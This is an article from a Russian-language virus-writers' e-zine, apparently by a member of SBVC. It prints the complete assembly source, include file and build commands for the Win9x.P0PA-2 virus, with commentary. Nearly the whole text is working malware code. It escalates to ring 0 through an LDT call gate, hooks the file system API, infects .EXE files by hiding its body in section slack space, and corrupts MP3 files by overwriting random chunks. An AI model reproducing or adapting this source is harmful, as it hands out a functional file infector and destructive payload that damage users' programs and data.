          
 █│█│█▀█│█▄▄ ▀┘▀█▀┘█▀█│▀█▀┘  █│█│ Win9x.ap0p или путешествие в ring-0
 █▀█│█▀█│█▄█│█│ █│ █▀█│ █│   ▀▀█│                   by Protagor /SBVC
─────────────────────────────────
   Дружественный чел из группы SBVC предоставил исходник своего творения под
Win9x. Приставка Win9x означает буквально следующее - данный вирь будет 
работать на следующих оперционках - Win95, Win96, Win97 и конечно на Win98, а
вот на WinNT и иже с ними работать не будет. Сия привередливость заключается
в следующем:
 1. Используется переход в нулевое кольцо, который не работает в WinNT
 2. Используются вызовы VXD (которых нет под WinNT)
Как вам должно быть известно - в Винде существуют уровни приоритета (в основном
используются 2): 
                Ring0 - уровень системы, где можно все
                Ring3 - где можно только то, что разрешено
Так вот данный вирь живет в первом кольце, что открывает перед ним широкие
возможности ;)
Переход в нулевое кольцо осуществляется посредством "CallGate", если вам чего
либо не ясно про это кольцо и как там живут - то смотрите туториал Billy Belcebu
в этом же журнале.
Теперь посмотрим в исходник этого творения с добавленными моими коментариями
===========================[Кут хере]========================================
; Win9x.P0PA-2 (Win95.Apop.????)
;
;  by SBVC
;
; Данный продукт является расширенной версией вируса Win9x.P0PA (Win95.Apop)
; отличается лишь тем, что был исправлен небольшой баг :) и изменина деструкция 
;
; Теперь описание:
;
; При старте инфицированной программы вирус переходит в ring0 методом LDT и
; садится на IFSAPI (как обычно:) В нуле вирус обрабатывает функцию IFSFN_OPEN
; т.е. открытие файла и рассматривает файлы с расширением .EXE и .MP3
; Если файл .EXE то вирус пытается его заразить... 
;
; Метод заражения EXE-файлов:
;
; Вирус раскидывает своё тело по секциям, т.е. записывает себя в свободное
; место в конце каждой файловой секции... Тем самым размер файла-жертвы не 
; увеличивается. Если в файле не достаточно места под вирус - он пропускается.
;
;
; Метод "заражения" MP3-файлов:
;
; Так сказать деструкция... В рандомное место MP3-шки записывается строчка,
; состоящая из 50 слов "Fuck", это конечно не ощутимо сразу на слух, но через
; какое-то время начинает доставать :))
; Фича заключается в том, что куски, поверх которых записывается заветная
; строчка сохраняются в самом конце файла... :) т.е. при желании MP3-шку можно
; привести к исходному состоянию... 
;
; Вроде всё! Разбирайтесь, если что - пишите rogatorp@yahoo.com.au 
;
; Мы компиляем так:
;
; tasm32 /s /m /z /ml p0pa2.asm
; tlink32 /Tpe /aa /c /x p0pa2,p0pa2.exe,, /L import32.lib
;

include p0pa2.inc			;Подключаем файл со всякой нужной
					;информацией
DEBUG = 0				;Режим отладки (выключен),если поставить
					;1 - то вирь будет работать с файлами
					;*.zzz и *.mpZ
						
.386p
.model flat

extrn ExitProcess:PROC			;Определение ф-ции для первого запуска

.data

P0PA_Start:

                pusha			;Получаем дельту
                call      P0PA_Init
P0PA_Init:
                pop       EBP
                sub       EBP, offset(P0PA_Init - P0PA_Start)

                call      set_seh       ;Ставим свой SEH
                mov       ESP, [ESP + 8]
                jmp       short Exit_Main
set_seh:
                push      4 ptr FS:[0]
                mov       FS:[0], ESP

                call      get_r0        ;определим адрес процедуры инсталяции

                call      ring0_proc
                retf                    ;обратно в третье кольцо
get_r0:
                pop       ESI		;ESI = адрес проц-ры инсталяции

                push      EBX		;получаем адрес GDT
                sgdt      [ESP - 2]
                pop       EBX

                sldt      AX		; Получим селектор LDT 
                and       EAX, not 111b
                jz        short Exit_Main

                add       EBX, EAX	; Адрес дескриптора LDT в GDT

                mov       EDI, [EBX + 2 - 2] ; Получим адрес LDT
                mov       AH, [EBX + 7]
                mov       AL, [EBX + 4]
                shrd      EDI, EAX, 16

                fild      8 ptr [EDI]    ; Сохраним дескриптор

                mov       EAX, ESI       ; Сделаем новый дескриптор callgate
                cld
                stosw
                mov       EAX, 1110110000000000b shl 16 + 28h
                stosd
                shld      EAX, ESI, 16
                stosw

                db        9Ah            ; Ну и соответственно вызовем его
                dd        0
                dw        100b + 11b     ; sel.#0, LDT, r3

                fistp     8 ptr [EDI - 8]; Восстановим дескриптор

Exit_Main:
                pop       4 ptr FS:[0]   ; Удалим SEH
                pop       EAX
                popa

                db        68h            ; опкод комманды push

Exit_VA = $ - P0PA_Start

                dd        offset exit
                retn

ring0_proc:                              ; r0 начинается здесь
                pushad
                mov       EAX, DR3	 ; Проверим на наличие себя в памяти
                cmp       EAX, 'P0PA'
                je        exit_r0

                ; Выделим память
                push      PAGEFIXED + PAGEZEROINIT
                xor       EAX, EAX
                push      EAX            ; Физич. адрес
                push      EAX            ; max
                push      EAX            ; min
                push      EAX            ; Выровнять
                push      EAX            ; хэндл VM = 0 если PG_SYS
                push      PG_SYS         ; Память в системной области
                push      virpages       ; Кол-во страниц

PatchOffset = $ - P0PA_Start

                VMMcall   PageAllocate

                add       ESP, 32
                or        EAX, EAX       ; Проверимся на ошибку
                jz        short exit_r0

                db        0BBh           ; Опкод комманды mov EBX, im32
Obj_Tbl_VA = $ - P0PA_Start
                dd        40018Fh        ; VA таблицы объектов для этого ехе

                db        0BAh           ; опкод комманды mov EDX, im32
MainLen_Offset = $ - P0PA_Start
                dd        virusLen

                ; Копируем себя в память
                cld
                mov       EDI, EAX
                mov       ESI, EBP
                mov       ECX, EDX
                rep movsb

copy_next:
                cmp       EDX, virusLen
                je        short make_clear_copy
                mov       ESI, [EBX + 18h + 4]
                mov       ECX, [EBX + 18h]
                mov       EDI, EDX
                add       EDI, EAX
                add       EDX, ECX
                add       EBX, 28h
                rep movsb
                jmp       short copy_next

make_clear_copy:
                mov       ESI, EAX
                lea       EDI, [EAX + virbuffer - P0PA_Start]
                mov       ECX, EDX
                rep movsb

                ; Патчим свой код
                lea       EDI, [EAX + virbuffer - P0PA_Start + PatchOffset]
                mov       2 ptr [EDI], 20CDh
                mov       4 ptr [EDI + 2], 00010053h

                mov       ESI, EAX
                push      EAX
                add       ESI, offset(IFSAPI_handler - P0PA_Start)
                ; ESI = адрес процедуры перехватаIFS API 
                push      ESI
                VxDcall   IFSMGR, InstallFileSystemApiHook
                add       SP, 4
                pop       EDI
                ; Сохраним прдыдущий указатель
                mov       [EDI + old_IFSAPI - P0PA_Start], EAX

                ; Мы уже здесь!
                mov       EAX, 'P0PA'
                mov       DR3, EAX

exit_r0:
                popad
                retn                                ; конец r0 

Loader_Size = $ - P0PA_Start


IFSAPI_handler:
                pushad
                call       get_addr

get_addr:
                pop        EBP
                sub        EBP, get_addr - IFSAPI_handler

                ; Мы сами с файлами работаем?
                lea        EAX, [EBP + semafore - IFSAPI_handler]
                cmp        1 ptr [EAX], 0
                jne        Exit_IFSAPI_handler

                ; Установим флаг
                inc        1 ptr [EAX]
                push       EAX

                ; Наша функция?
                cmp        4 ptr function, IFSFN_OPEN
                jne        End_IFSAPI_handler


                ; Узнаем имя файла
                lea        EDI, [EBP + filepath - IFSAPI_handler]
                mov        EAX, drive	; Диск
                or         AL, AL
                jle        End_IFSAPI_handler
                lea        EBX, ioreq_ptr ; указатель на структуру IOREQ

                add        AL, 64
                stosb
                mov        AL, ':'
                stosb
                push       0
                push       7Fh
                mov        EBX, [EBX]
                mov        EAX, [EBX + 0Ch]
                add        EAX, 4
                push       EAX
                push       EDI
                VxDcall    IFSMGR, UniToBCSPath
                add        ESP, 10h
                or         EDX, EDX
                jne        End_IFSAPI_handler
                mov        EDX, EDI
                sub        EDX, 2                  ; EDX -> Имя файла
                add        EDI, EAX                ; EDI -> Конец имени файла
                mov        1 ptr [EDI], 0          ; Сделаем ASCIIZ 

                ; Инфицирование

                ; Переведем буквы в нижний регистр
                mov        EAX, [EDI - 4]
                or         EAX, 20202000h

        IF DEBUG	;Если отлаживаем вирус то вместо mp3 - mpz
                cmp        EAX, 'zpm.'
        ELSE
                cmp        EAX, '3pm.'
        ENDIF
                je         FuckMP3

        IF DEBUG	;И вместо exe -zzz
                cmp        EAX, 'zzz.'
        ELSE
                cmp        EAX, 'exe.'
        ENDIF
                jne        End_IFSAPI_handler

                call       ClearAttr_And_OpenFile

                ; Прочитаем DOS header + stub + PE header + obj table + ???
                xor        ESI, ESI
                mov        ECX, bytes_to_read
                lea        EDX, [EBP + buffer - IFSAPI_handler]
                call       fread
                jc         Close_File

                cmp        2 ptr [EDX], 'ZM'
                jne        Close_File

                mov        ESI, [EDX + 3Ch]        ; ESI = смещение заголовка PE
                mov        EAX, ESI
                add        ESI, EDX                ; ESI -> заголовок PE
                cmp        2 ptr [ESI], 'EP'
                jne        Close_File

                cmp        [ESI + 44h], 'CVBS'     ; Инфицированно ?
                je         Close_File

                movzx      EDI, 2 ptr [ESI + 14h]  ; EDI = размер заголовка
                add        EDI, 18h
                mov        EDX, 4 ptr [ESI + 34h]  ; EDX = начальный адрес загрузки
                add        EDX, EAX
                add        EDX, EDI                ; EDX = VA таблицы объектов
                mov        [EBP + virbuffer - IFSAPI_handler + Obj_Tbl_VA], EDX
                add        EDI, ESI                ; EDI -> табл. объектов,1 об.

                ; Считаем неиспользованные места в файле
                movzx      EBX, 2 ptr [ESI + 06h]  ; EBX = счетчик объектов
                mov        ECX, EBX                ; ECX = счетчик объектов
                xor        EAX, EAX
                push       EDI
summ:
                mov        EDX, [EDI + 10h]        ; EDX = физич. размер
                sub        EDX, [EDI + 08h]        ; EDX = физич. - виртуальный
                js         short skip_obj
                add        EAX, EDX
skip_obj:
                add        EDI, 28h
                loop       short summ

                pop        EDX                     ; EDX -> таблица объектов
                sub        EAX, virusLen
                js         Close_File              ; Нет места

                ; find space for code
                mov        EDI, EDX                ; EDI -> таблица объектов
                mov        ECX, EBX                ; ECX = кол-во объектов
next_sect:
                mov        EAX, [EDI + 10h]        ; EAX = физич. размер
                sub        EAX, [EDI + 08h]        ; - виртуальный
                sub        EAX, Loader_Size
                jns        short Write_Code
                add        EDI, 28h
                loop       short next_sect

                jmp        Close_File

Write_Code:
                mov        [ESI + 44h], 'CVBS'     ; Поставим метку
                mov        EAX, [ESI + 34h]        ; EAX = нач. адр. загрузки
                ; сохраним его
                mov        [EBP + imgb - IFSAPI_handler], EAX

                mov        ECX, [ESI + 28h]        ; ECX = RVA точки входа
                add        ECX, EAX                ; ECX += адр. загр. = VA входа
                ; Сохраним старый VA точки входа
                mov        [EBP + virbuffer - IFSAPI_handler + Exit_VA], ECX

                ; Высчитаем новый RVA точки входа
                mov        EAX, [EDI + 0Ch]        ; EAX = RVA объекта
                add        EAX, [EDI + 08h]        ; EAX += виртуальный размер
                mov        [ESI + 28h], EAX        ; Установим новый

                ; Высчитаем размер главной части
                mov        EAX, virusLen
                mov        ECX, [EDI + 10h]        ; ECX = физич. размер
                sub        ECX, [EDI + 08h]        ; ECX = размер дырки
                cmp        ECX, EAX
                jna        short not_above_vir_size
                mov        ECX, EAX

not_above_vir_size:

                lea        EAX, [EBP + virbuffer - IFSAPI_handler + MainLen_Offset]
                mov        [EAX], ECX

                ; Установим флаги: E + R + I - D
                or         4 ptr [EDI + 24h], 40000000h or 20000000h or 00000040h
                btc        4 ptr [EDI + 24h], 25

                mov        ESI, [EDI + 14h]        ; ESI = физич. смещение
                add        ESI, [EDI + 08h]        ; ESI = файловое смещ. дырки
                add        [EDI + 08h], ECX        ; увелич. виртуальн. размер

                mov        EDI, EDX                ; EDI -> таблица объектов

                lea        EDX, [EBP + virbuffer - IFSAPI_handler]
                call       fwrite
                jc         short Close_File

                ; теперь запишем хвост
                mov        EDX, ECX                ; EDX = байт записано
process_next:
                mov        ECX, virusLen
                sub        ECX, EDX                ; ECX = байт осталось
                jz         short Write_Header      ; Нечего записывать

                mov        EAX, [EDI + 10h]        ; EAX = физич. размер
                sub        EAX, [EDI + 08h]        ; - виртуальный = размер дыры
                js         short skip_sect
                jz         short skip_sect
                cmp        EAX, ECX
                jg         short greater           ; размер дырки больше
                mov        ECX, EAX
greater:
                ; Флаги: R + I - D
                or         4 ptr [EDI + 24h], 40000000h or 00000040h
                btc        4 ptr [EDI + 24h], 25
                ; Параметры нашего загрузчика
                mov        ESI, [EDI + 0Ch]        ; RVA объекта
                add        ESI, [EDI + 08h]        ; + виртуальный размер
                add        ESI, [EBP + imgb - IFSAPI_handler]
                ; ESI = VA наших данных
                mov        [EDI + 18h + 4], ESI    ; сохраним это
                mov        [EDI + 18h], ECX        ; сохраним длинну

                mov        ESI, [EDI + 14h]        ; физич. смещение объекта
                add        ESI, [EDI + 08h]        ; файловое смещение
                add        [EDI + 08h], ECX        ; установим виртуальн. размер

                mov        EAX, EDX                ; EAX = байт записанно
                lea        EDX, [EBP + virbuffer - IFSAPI_handler]
                add        EDX, EAX
                call       fwrite
                jc         short Close_File
                add        EAX, ECX                ; увеличим кол-во запис. байт
                mov        EDX, EAX                ; EDX = байт записано
skip_sect:
                add        EDI, 28h
                dec        EBX
                jnz        short process_next

Write_Header:
                ; и теперь записываем измененный заголовок обратно в файл
                lea        EDX, [EBP + buffer - IFSAPI_handler]
                xor        ESI, ESI
                mov        ECX, bytes_to_read
                call       fwrite

Close_File:
                call       fclose

RestoreAttrs:
                pop        ECX
                pop        ESI
                mov        EAX, R0_FILEATTRIBUTES + 1
                VxDcall    IFSMGR, Ring0_FileIO

End_IFSAPI_handler:
                pop        EAX
                dec        1 ptr [EAX]

Exit_IFSAPI_handler:

                popad
                db        0FFh, 25h                ; jmp

old_IFSAPI label dword

                dd        0

FuckMP3:
                ; деструкция

                call      ClearAttr_And_OpenFile

                ; узнали текущий размер файла
                mov       EBX, [EBP + hfile - IFSAPI_handler]
                mov       EAX, R0_GETFILESIZE
                VxDcall   IFSMGR, Ring0_FileIO
                mov       [EBP + filesize - IFSAPI_handler], EAX
                mov       [EBP + tempvar - IFSAPI_handler], EAX

                sub       EAX, 12
                xchg      EAX, ESI
                mov       ECX, 12
                lea       EDX, [EBP + buffer - IFSAPI_handler]
                call      fread
                cmp       4 ptr [EBP + buffer - IFSAPI_handler],'P0PA'
                jne       gofuck
                mov       EAX, 4 ptr [EBP + buffer + 8 - IFSAPI_handler]
                mov       [EBP + tempvar - IFSAPI_handler], EAX

         gofuck:

;int 03
;=== Random ===
                pushad
                mov       EDI, [EBP + tempvar - IFSAPI_handler]
         random:
                mov       EAX, [EBP + seed - IFSAPI_handler]
                mov       EBX, 48C27395h
                mul       EBX
                shr       EAX, 2
                shl       EDX, 30
                or        EAX, EDX
                mov       [EBP + seed - IFSAPI_handler], EAX
                mov       EAX, 80000000h
                mov       ECX, 32
         test:
                test      EDI, EAX
                pushf
                shr       EAX, 1
                popf
                loopz     test
                neg       ECX 
                add       ECX, 30
                mov       EAX, 80000000h
                sar       EAX, CL
                not       EAX
                and       EAX, [EBP + seed - IFSAPI_handler]
                cmp       EAX, EDI 
                ja        random   
                mov       [EBP + rn - IFSAPI_handler], EAX
                popad
;== /Random ===


                mov       ESI, [EBP + rn - IFSAPI_handler]

                mov       ECX, bytes_to_add
                lea       EDX, [EBP + buffer - IFSAPI_handler]
                call      fread

                mov       EDX, [EBP + tempvar - IFSAPI_handler]
                mov       4 ptr [EBP + buffer + bytes_to_add - IFSAPI_handler],'P0PA'   ;сигнатура
                mov       4 ptr [EBP + buffer + bytes_to_add + 4 - IFSAPI_handler], ESI ;смещение косячиного куска
                mov       4 ptr [EBP + buffer + bytes_to_add + 8 - IFSAPI_handler], EDX ;размер файла до всех изменений


                push      ESI

                mov       ESI, [EBP + filesize - IFSAPI_handler]
                mov       ECX, bytes_to_add+12
                lea       EDX, [EBP + buffer - IFSAPI_handler]
                call      fwrite

                mov       EAX, 'kcuF'
                lea       EDI, [EBP + buffer - IFSAPI_handler]
                mov       ECX, (bytes_to_add / 4)
                rep       stosd

                pop       ESI
                mov       ECX, bytes_to_add
                lea       EDX, [EBP + buffer - IFSAPI_handler]
                call      fwrite

                jmp       Close_File


ClearAttr_And_OpenFile:
                pop        4 ptr [EBP + tempvar - IFSAPI_handler]

                ; get attrs
                mov        ESI, EDX
                mov        EAX, R0_FILEATTRIBUTES
                VxDcall    IFSMGR, Ring0_FileIO
                ; Если файл не существует - выходим
                jc         End_IFSAPI_handler

                ; clear all attrs
                mov        EDI, ECX
                xor        ECX, ECX
                mov        EAX, R0_FILEATTRIBUTES + 1
                VxDcall    IFSMGR, Ring0_FileIO
                jc         End_IFSAPI_handler
                push       EDX                                ; Сохраним имя
                push       EDI                                ; Сохраним атрибуты

                ; open file
                call       fopen
                jc         RestoreAttrs
                mov        [EBP + hfile - IFSAPI_handler], EAX

                jmp        [EBP + tempvar - IFSAPI_handler]

;-------- ring-0 file io, thanks to Z0MBiE, great work ;) ------------------

access_eax        equ     (dword ptr 7*4)

; i: esi=filename
; o: cf, eax=handle
fopen:
                pusha
                mov        EAX, R0_OPENCREATFILE
                mov        BX, 2022h            ; no int 24, denywrite, r/w
                mov        CX, 32               ; archive (unused here)
                mov        DX, 01h              ; fail | open
                VxDcall    IFSMGR, Ring0_FileIO
                mov        [ESP].access_eax, EAX
                popa
                ret

; i:
fclose:
                pusha
                mov        EBX, [EBP + hfile - IFSAPI_handler]
                mov        EAX, R0_CLOSEFILE
                VxDcall    IFSMGR, Ring0_FileIO
                popa
                ret

; i:
;    edx=buffer
;    ecx=size
;    esi=file pos
; o:
fread:
                pusha
                mov        EBX, [EBP + hfile - IFSAPI_handler]
                mov        EAX, R0_READFILE
                xchg       EDX, ESI
                VxDcall    IFSMGR, Ring0_FileIO
                popa
                ret

; i:
;    edx=buffer
;    ecx=size
;    esi=file pos
; o:
fwrite:
                pusha
                mov        EBX, [EBP + hfile - IFSAPI_handler]
                mov        EAX, R0_WRITEFILE
                xchg       EDX, ESI
                VxDcall    IFSMGR, Ring0_FileIO
                popa
                ret

seed            dd                        666   ; нужно для рандома
                                                ; но по идеи надо устанавливать
                                                ; по таймеру    


virusLen        equ        ($ - P0PA_Start)

bytes_to_read   equ                       500h
bytes_to_add    equ                       200   ; сколько байт добавлять в MP3
path_len        equ                       300

hfile           dd                        ?
imgb            dd                        ?
semafore        db                        0
filepath        db                        path_len dup (?)
virbuffer       db                        virusLen dup (?)
buffer          db                        (bytes_to_add + 12) dup (?)
tempvar         dd                        ?   ; реальный размер mp3
filesize        dd                        ?   ;
rn              dd                        ?   ;

virpages        equ        ($ - P0PA_Start + 4095) / 4096

.code

start:
                call        P0PA_Start
exit:
                push        00000000h
                call        ExitProcess
end start
===========================[Кут хере]========================================

А вот для него p0pa2.inc:
===========================[Кут хере]========================================
VxDcall macro VxD, Service
	db	0CDh
	db	020h
	dw	Service
	dw	VxD
endm

VMMcall	macro Service
	VxDcall	VMM, Service
endm

function                equ   <[esp+0ch+28 + 4]>;the function that is being performed
drive                   equ   <[esp+10h+28 + 4]>;the 1-based drive the operation is being performed on (-1 if UNC)
ioreq_ptr               equ   <[esp+1ch+28 + 4]>;pointer to IOREQ structure

VMM                     equ     0001h
PageAllocate            equ     0053h
PageFree		equ	0055h
Exec_VxD_Int		equ	008Fh
PAGEZEROINIT            equ     00000001h
PAGEFIXED               equ     00000008h
PG_SYS                  equ     1
PageModifyPermissions   equ     0133h
PC_WRITEABLE            equ     00020000H
PC_USER                 equ     00040000H
PC_STATIC               equ     20000000H
Call_When_Idle          equ     003Ah
Get_System_Time         equ     003Fh
Install_IO_Handler      equ     0096h
IFSMGR                  equ     0040h
InstallFileSystemApiHook equ    0067h
IFSFN_OPEN              equ     36
IFSFN_RENAME            equ     37
IFSFN_FILEATTRIB        equ     33
UniToBCSPath            equ     0041h
Ring0_FileIO            equ     0032h
R0_OPENCREATFILE        equ     0D500h  ; Open/Create a file
R0_OPENCREAT_IN_CONTEXT equ     0D501h  ; Open/Create file in current context
R0_READFILE             equ     0D600h  ; Read a file, no context
R0_WRITEFILE            equ     0D601h  ; Write to a file, no context
R0_READFILE_IN_CONTEXT  equ     0D602h  ; Read a file, in thread context
R0_WRITEFILE_IN_CONTEXT equ     0D603h  ; Write to a file, in thread context
R0_CLOSEFILE            equ     0D700h  ; Close a file
R0_GETFILESIZE          equ     0D800h  ; Get size of a file
R0_FINDFIRSTFILE        equ     04E00h  ; Do a LFN FindFirst operation
R0_FINDNEXTFILE         equ     04F00h  ; Do a LFN FindNext operation
R0_FINDCLOSEFILE        equ     0DC00h  ; Do a LFN FindClose operation
R0_FILEATTRIBUTES       equ     04300h  ; Get/Set Attributes of a file
GET_ATTRIBUTES          equ     00h
SET_ATTRIBUTES          equ     01h
R0_RENAMEFILE           equ     05600h  ; Rename a file
R0_DELETEFILE           equ     04100h  ; Delete a file
R0_LOCKFILE             equ     05C00h  ; Lock/Unlock a region in a file
R0_GETDISKFREESPACE     equ     03600h  ; Get disk free space
R0_READABSOLUTEDISK     equ     0DD00h  ; Absolute disk read
R0_WRITEABSOLUTEDISK    equ     0DE00h  ; Absolute disk write
===========================[Кут хере]========================================





